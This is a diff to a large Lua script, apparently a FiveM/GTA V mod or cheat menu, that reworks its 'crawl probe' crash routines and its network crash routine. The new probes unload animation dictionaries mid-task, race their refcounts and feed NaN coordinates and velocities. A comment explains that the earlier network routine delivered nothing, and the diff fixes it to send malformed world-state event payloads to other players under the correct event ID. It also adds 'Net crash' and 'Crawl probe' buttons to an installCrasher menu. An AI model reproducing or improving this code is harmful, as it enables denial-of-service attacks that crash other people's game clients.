@@ -20843,50 +20843,70 @@ end
 -- ---------------------------------------------------------------------------
 C.crawlIndex = 0
 C.crawlProbes = {
-    { name = "anim blend -4/-4", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", -4.0, -4.0, -1, 1, 0.0, false, false, false)
+    { name = "dict unload mid task", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
+        Citizen.Wait(30)
+        for i = 1, 4 do RemoveAnimDict("move_crawl") end
     end },
-    { name = "anim blend -8/-8", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", -8.0, -8.0, -1, 1, 0.0, false, false, false)
+    { name = "dict unload then play", run = function(me)
+        RequestAnimDict("move_crawl")
+        local t = GetGameTimer() + 1500
+        while not HasAnimDictLoaded("move_crawl") and GetGameTimer() < t do Citizen.Wait(0) end
+        for i = 1, 3 do RemoveAnimDict("move_crawl") end
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
     end },
-    { name = "anim rate -4", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, -4.0, false, false, false)
+    { name = "dict refcount race 200", run = function(me)
+        for i = 1, 200 do
+            RequestAnimDict("move_crawl")
+            RemoveAnimDict("move_crawl")
+        end
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
     end },
-    { name = "anim duration max", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, 0x7FFFFFFF, 1, 0.0, false, false, false)
+    { name = "set unload mid clipset", run = function(me)
+        SetPedMovementClipset(me, "move_crawl", 1.0)
+        Citizen.Wait(30)
+        for i = 1, 4 do RemoveAnimSet("move_crawl") end
     end },
-    { name = "anim blend 1e9", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 1.0e9, -1.0e9, -1, 1, 0.0, false, false, false)
+    { name = "set unload then clipset", run = function(me)
+        RequestAnimSet("move_crawl")
+        local t = GetGameTimer() + 1500
+        while not HasAnimSetLoaded("move_crawl") and GetGameTimer() < t do Citizen.Wait(0) end
+        for i = 1, 3 do RemoveAnimSet("move_crawl") end
+        SetPedMovementClipset(me, "move_crawl", 1.0)
     end },
-    { name = "anim prone2crawl -4", run = function(me)
-        TaskPlayAnim(me, "move_crawlprone2crawlfront", "front", -4.0, -4.0, -1, 1, 0.0, false, false, false)
+    { name = "clear task mid unload", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
+        RemoveAnimDict("move_crawl")
+        ClearPedTasksImmediately(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
     end },
-    { name = "advanced animTime -4", run = function(me)
-        local c = GetEntityCoords(me)
-        TaskPlayAnimAdvanced(me, "move_crawl", "onfront_fwd",
-            c.x, c.y, c.z, 0.0, 0.0, 0.0,
-            8.0, -8.0, -1, 1, -4.0, 0.0, 2)
+    { name = "prone dict unload", run = function(me)
+        TaskPlayAnim(me, "move_crawlprone2crawlfront", "front", 8.0, -8.0, -1, 1, 0.0, false, false, false)
+        Citizen.Wait(25)
+        for i = 1, 4 do RemoveAnimDict("move_crawlprone2crawlfront") end
     end },
-    { name = "clipset blend -4", run = function(me)
-        SetPedMovementClipset(me, "move_crawl", -4.0)
-    end },
-    { name = "clipset blend nan", run = function(me)
-        SetPedMovementClipset(me, "move_crawl", 0.0 / 0.0)
-    end },
-    { name = "ragdoll type -4", run = function(me)
+    { name = "ragdoll then unload", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
         SetPedCanRagdoll(me, true)
-        SetPedToRagdoll(me, 3000, 3000, -4, false, false, false)
+        SetPedToRagdoll(me, 3000, 3000, 0, false, false, false)
+        Citizen.Wait(20)
+        for i = 1, 4 do RemoveAnimDict("move_crawl"); RemoveAnimSet("move_crawl") end
     end },
-    { name = "ragdoll fall -4", run = function(me)
-        SetPedCanRagdoll(me, true)
-        SetPedToRagdollWithFall(me, 3000, 3000, 0,
-            -4.0, -4.0, -4.0, -4.0, -4.0, -4.0, -4.0)
+    { name = "nan coords", run = function(me)
+        SetEntityCoords(me, 0.0 / 0.0, 0.0 / 0.0, 0.0 / 0.0, false, false, false, true)
     end },
-    { name = "move rate -4", run = function(me)
-        SetPedMoveRateOverride(me, -4.0)
+    { name = "nan velocity", run = function(me)
+        SetEntityVelocity(me, 0.0 / 0.0, 0.0 / 0.0, 0.0 / 0.0)
+    end },
+    { name = "clone attach delete", run = function(me)
+        local c = ClonePed(me, false, false, true)
+        if c and c ~= 0 then
+            AttachEntityToEntity(c, me, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
+            Citizen.Wait(20)
+            DeleteEntity(c)
+        end
     end },
 }
-
 function C.crawlProbe()
     local stamp = now()
     if C.probeAt and stamp - C.probeAt < 1500 then return false end
@@ -22530,7 +22550,13 @@ local NET = (function(O, C)
         -- verbatim and each receiver Handle()s it as a CNetworkScriptWorldState.
         -- The dump put a -4.0 float where a refcounted object pointer was
         -- expected, so the payload carries -4.0 and world-state type guesses.
+        -- SCRIPT_WORLD_STATE_EVENT is GTA net event id 33. The receiver
+        -- dispatches on eventId, not on eventNameHash: the server copies
+        -- eventId verbatim (NetGameEventPacketHandlerV2) and the client
+        -- handler is looked up by that index. Sending 1..N, as the first
+        -- version did, delivered nothing at all.
         local EVENT = 0xC00B8EB5
+        local EVENT_ID = 33
         local payloads = {
             {},
             { 0x00, 0x00, 0x00, 0x00 },
@@ -22545,7 +22571,7 @@ local NET = (function(O, C)
         Citizen.CreateThread(function()
             local sent = 0
             for i = 1, #payloads do
-                if NET.emitEvent(ids, EVENT, i, payloads[i]) then sent = sent + 1 end
+                if NET.emitEvent(ids, EVENT, EVENT_ID, payloads[i]) then sent = sent + 1 end
                 Citizen.Wait(900)
             end
             O.log("net crash: %d/%d world state events", sent, #payloads)
@@ -31450,7 +31476,14 @@ local function installCrasher()
             end,
         },
         {
-            name = "Crawl crash",
+            name = "Net crash",
+            type = "action",
+            onClick = function()
+                NET.crash()
+            end,
+        },
+        {
+            name = "Crawl probe",
             type = "action",
             onClick = function()
                 C.crawlProbe()
